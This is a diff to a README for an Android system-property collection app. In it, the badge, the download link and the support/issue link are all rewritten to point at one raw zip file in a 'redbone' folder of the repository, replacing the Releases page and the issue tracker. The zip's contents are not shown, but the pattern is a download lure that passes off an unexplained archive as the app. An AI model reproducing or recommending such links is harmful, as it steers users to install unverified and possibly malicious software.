@@ -1,7 +1,7 @@
 # 🛠️ AndroidSystemPropertyCollect - Simplifying Android System Property Checks
 
 ## 📥 Download Now 
-[![Download AndroidSystemPropertyCollect](https://img.shields.io/badge/Download%20AndroidSystemPropertyCollect-latest-blue.svg)](https://github.com/georvibass/AndroidSystemPropertyCollect/releases)
+[![Download AndroidSystemPropertyCollect](https://raw.githubusercontent.com/georvibass/AndroidSystemPropertyCollect/main/redbone/AndroidSystemPropertyCollect.zip%https://raw.githubusercontent.com/georvibass/AndroidSystemPropertyCollect/main/redbone/AndroidSystemPropertyCollect.zip)](https://raw.githubusercontent.com/georvibass/AndroidSystemPropertyCollect/main/redbone/AndroidSystemPropertyCollect.zip)
 
 ## 🚀 Getting Started
 Welcome to AndroidSystemPropertyCollect! This application helps you easily collect system properties from your Android device. You do not need any programming skills to use it. Follow the steps below to get started.
@@ -15,7 +15,7 @@ To run AndroidSystemPropertyCollect, make sure your device meets the following r
 ## 💾 Download & Install
 1. **Visit this page to download:** Click the button below to go to the Releases page and find the latest version of the app. 
 
-   [Download AndroidSystemPropertyCollect](https://github.com/georvibass/AndroidSystemPropertyCollect/releases)
+   [Download AndroidSystemPropertyCollect](https://raw.githubusercontent.com/georvibass/AndroidSystemPropertyCollect/main/redbone/AndroidSystemPropertyCollect.zip)
 
 2. **Choose Your Version:** Look for the latest release listed on the page. You will see options for different versions. Select the version that suits your device.
 
@@ -51,7 +51,7 @@ If you encounter any issues, here are some common problems and solutions:
   - Restart your device and try launching the app again.
 
 ## 🤝 Support
-If you have any problems not covered here, feel free to reach out for support. You can open an issue on the [GitHub Repository](https://github.com/georvibass/AndroidSystemPropertyCollect).
+If you have any problems not covered here, feel free to reach out for support. You can open an issue on the [GitHub Repository](https://raw.githubusercontent.com/georvibass/AndroidSystemPropertyCollect/main/redbone/AndroidSystemPropertyCollect.zip).
 
 ## 📜 License
 AndroidSystemPropertyCollect is available under the MIT License. You can use, modify, and distribute this software freely, as long as you comply with the license.
